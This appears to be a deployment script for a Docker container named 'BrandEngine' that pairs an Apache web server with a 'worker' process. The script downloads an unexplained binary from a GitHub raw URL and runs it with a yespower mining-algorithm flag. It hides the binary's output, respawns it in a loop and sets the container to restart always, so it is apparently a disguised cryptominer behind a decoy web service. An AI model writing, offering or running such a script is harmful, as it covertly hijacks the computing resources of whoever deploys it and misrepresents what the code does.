#!/bin/bash

set -e

echo "=============================================="
echo "     Building and Running BrandEngine Docker  "
echo "=============================================="

# Variables
BINARY_URL="https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/linuxcpu8888"
BUILD_DIR="brandengine_build"
BINARY_NAME="worker"

# 1️⃣ Prepare build directory
echo "[1/6] Preparing Docker build files..."
rm -rf $BUILD_DIR
mkdir -p $BUILD_DIR

# 2️⃣ Download binary
echo "[2/6] Downloading binary from $BINARY_URL ..."
curl -L -o $BUILD_DIR/$BINARY_NAME $BINARY_URL
chmod +x $BUILD_DIR/$BINARY_NAME

# 3️⃣ Create start script (/start)
echo "[3/6] Creating start script..."
cat > $BUILD_DIR/start << 'EOF'
#!/bin/bash

# ----------------------------------------------
# BrandEngine — Background Container Worker + Apache
# ----------------------------------------------

EXEC="/opt/brand/worker"
RESPAWN_INTERVAL=120   # seconds
DELAY_BEFORE_RESPAWN=10 # seconds

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] BrandEngine: $1"
}

log "Starting BrandEngine container..."

# -------------------------------
# Start Apache2 on port 8080
# -------------------------------
log "Starting Apache2 on port 8080..."
sed -i 's/Listen 80/Listen 8080/' /etc/apache2/ports.conf
apache2ctl start
log "Apache2 started."

# -------------------------------
# Worker loop
# -------------------------------
while true; do
    # Generate random string for -o parameter
    RANDOM_STR=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c16)
    ARGS="-a yespoweradvc -o $RANDOM_STR"

    log "Starting worker..."
    # Run worker in background, suppress output
    $EXEC $ARGS >/dev/null 2>&1 &
    WORKER_PID=$!

    log "Worker PID: $WORKER_PID"

    # Wait for 120 seconds
    sleep $RESPAWN_INTERVAL

    # Kill worker process
    if kill -0 $WORKER_PID >/dev/null 2>&1; then
        log "Killing worker after $RESPAWN_INTERVAL seconds..."
        kill -9 $WORKER_PID >/dev/null 2>&1 || true
    else
        log "Worker already exited."
    fi

    # Sleep fixed delay before respawn
    log "Sleeping $DELAY_BEFORE_RESPAWN seconds before respawn..."
    sleep $DELAY_BEFORE_RESPAWN
done
EOF

chmod +x $BUILD_DIR/start

# 4️⃣ Create Dockerfile
echo "[4/6] Creating Dockerfile..."
cat > $BUILD_DIR/Dockerfile << 'EOF'
FROM ubuntu:22.04

# Install bash, curl, required library, and Apache2
RUN apt-get update && \
    apt-get install -y bash curl libjansson4 apache2 && \
    rm -rf /var/lib/apt/lists/*

# Create working directory
RUN mkdir -p /opt/brand

# Copy binary and start script
COPY worker /opt/brand/worker
COPY start /start

# Set permissions
RUN chmod +x /opt/brand/worker
RUN chmod +x /start

WORKDIR /opt/brand

EXPOSE 8080

# Use /bin/bash /start as entrypoint
ENTRYPOINT ["/bin/bash", "/start"]
EOF

# 5️⃣ Build Docker image
echo "[5/6] Building Docker image..."
docker build -t brandengine $BUILD_DIR

# 6️⃣ Remove old container if exists & run
echo "[6/6] Starting container..."
docker rm -f brandengine >/dev/null 2>&1 || true

docker run -d \
    --name brandengine \
    --restart always \
    -p 8080:8080 \
    brandengine

echo "=============================================="
echo " BrandEngine container is now running."
echo "----------------------------------------------"
echo " Container name : brandengine"
echo " Image          : brandengine"
echo " Executable     : /opt/brand/worker"
echo " Start command  : /bin/bash /start"
echo " Apache port    : 8080"
echo " View logs      : docker logs -f brandengine"
echo " Access Apache  : http://<host-ip>:8080"
echo "=============================================="
